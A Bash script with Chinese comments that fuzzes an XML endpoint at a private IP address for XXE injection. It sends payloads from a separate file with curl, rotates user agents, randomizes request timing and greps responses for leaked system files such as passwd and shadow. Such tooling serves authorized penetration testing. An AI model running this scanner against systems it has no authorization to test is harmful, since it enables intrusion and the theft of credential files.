#!/bin/bash

# XXE漏洞测试脚本
# 使用XXE_Fuzzing.txt中的载荷测试XML外部实体注入漏洞

# 配置参数
TARGET_URL="https://192.168.139.141/xml-processor"  # 目标XML处理端点
DURATION=300                                   # 测试持续时间(秒)
BASE_RATE=2                                    # 基础请求速率(请求/秒)
LOG_FILE="xxe_test_$(date +%Y%m%d_%H%M%S).log"
PAYLOAD_FILE="XXE_Fuzzing.txt"

# 用户代理列表
USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
  "curl/7.68.0"
)

# 检查载荷文件是否存在
if [ ! -f "$PAYLOAD_FILE" ]; then
  echo "错误: 载荷文件 $PAYLOAD_FILE 不存在!"
  exit 1
fi

# 读取载荷文件
mapfile -t PAYLOADS < "$PAYLOAD_FILE"

# 初始化日志文件
echo "XXE漏洞测试报告 - $(date)" > $LOG_FILE
echo "目标URL: $TARGET_URL" >> $LOG_FILE
echo "载荷文件: $PAYLOAD_FILE" >> $LOG_FILE
echo "开始时间: $(date +%T)" >> $LOG_FILE
echo "----------------------------------------" >> $LOG_FILE

# 主扫描函数
start_scan() {
  local start_time=$(date +%s)
  local end_time=$((start_time + DURATION))
  local current_time=$(date +%s)
  local request_count=0
  local potential_xxe=0
  
  # 创建临时文件用于存储XML payload
  local tmp_file=$(mktemp)
  
  while [ $current_time -lt $end_time ]; do
    # 随机选择载荷和用户代理
    local random_payload=${PAYLOADS[$RANDOM % ${#PAYLOADS[@]}]}
    local user_agent=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
    
    # 随机请求速率(基础速率±1)
    local current_rate=$((BASE_RATE + (RANDOM % 3) - 1))
    [ $current_rate -lt 1 ] && current_rate=1
    
    # 将payload写入临时文件
    echo "$random_payload" > "$tmp_file"
    
    # 发送请求
    echo "[$(date +%T)] 测试 #$((++request_count)): ${random_payload:0:60}..." | tee -a $LOG_FILE
    
    # 使用curl发送XML请求
    local response=$(curl -X POST -s -k -v --http3 \
      -A "$user_agent" \
      -H "Content-Type: application/xml" \
      --data-binary "@$tmp_file" \
      "$TARGET_URL" 2>&1)
    
    # 记录响应摘要
    echo "$response" | grep -E '^< HTTP|Content-Type:|error|exception|file:|root:|passwd|shadow|boot\.ini' >> $LOG_FILE
    
    # 检测可能的XXE漏洞迹象
    if echo "$response" | grep -q -E 'root:|passwd|shadow|boot\.ini|file:|error in external entity'; then
      echo "[!] 可能的XXE漏洞: 敏感数据泄露或错误响应" >> $LOG_FILE
      echo "使用的payload: ${random_payload:0:60}" >> $LOG_FILE
      ((potential_xxe++))
    fi
    
    # 随机延迟控制速率
    sleep $(awk "BEGIN {print (1/$current_rate) + (($RANDOM%1000)/2000)}")
    
    current_time=$(date +%s)
  done
  
  # 删除临时文件
  rm -f "$tmp_file"
  
  echo "----------------------------------------" >> $LOG_FILE
  echo "扫描完成" >> $LOG_FILE
  echo "总请求数: $request_count" >> $LOG_FILE
  echo "潜在XXE漏洞发现: $potential_xxe" >> $LOG_FILE
  echo "平均速率: $((request_count / DURATION)) 请求/秒" >> $LOG_FILE
}

# 执行扫描
start_scan

# 结果摘要
echo -e "\n潜在XXE漏洞摘要:"
grep -B3 -A1 -i "可能的XXE漏洞" $LOG_FILE | sort | uniq -c | sort -nr

echo -e "\n敏感数据关键词出现统计:"
grep -E 'root:|passwd|shadow|boot\.ini|file:' $LOG_FILE | sort | uniq -c | sort -nr
